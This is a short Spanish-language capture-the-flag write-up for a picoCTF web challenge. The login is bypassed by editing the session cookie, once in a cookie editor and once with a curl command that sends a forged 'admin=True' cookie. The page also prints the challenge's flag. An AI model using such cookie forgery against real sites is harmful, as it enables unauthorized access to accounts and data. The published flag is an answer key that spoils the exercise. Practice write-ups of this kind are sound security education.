## Objetivo
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/44573/` ([link](https://jupiter.challenges.picoctf.org/problem/44573/)) or http://jupiter.challenges.picoctf.org:44573

Hints
- Hmm it doesn't seem to check anyone's password, except for Joe's?
## Solucion
- Intentamos entrar con el usuario Joe y obtenemos esto.
```
I'm sorry Joe's password is super secure. You're not getting in that way.
```
- Se intenta entrar con cualquier usuario y se obtiene lo siguiente.
```
Success: You logged in! Not sure you'll be able to see the flag though.
```
Al utilizar cokkie editor modificamos la cookie y obtenemos la bandera.
```
picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}
```
## Solucion 2

``` bash
┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/44573/flag -H 'Cookie:password=;username=;admin=True' | grep picoCTF
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   3152      0 --:--:-- --:--:-- --:--:--  3153
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_0c98aacc}</code></p>

┌──(wil㉿DESKTOP-FKOIV4I)-[~]
└─$
```
## Notas adicionales
## Referencias
- [Cookie (informática) - Wikipedia, la enciclopedia libre](https://es.wikipedia.org/wiki/Cookie_(inform%C3%A1tica))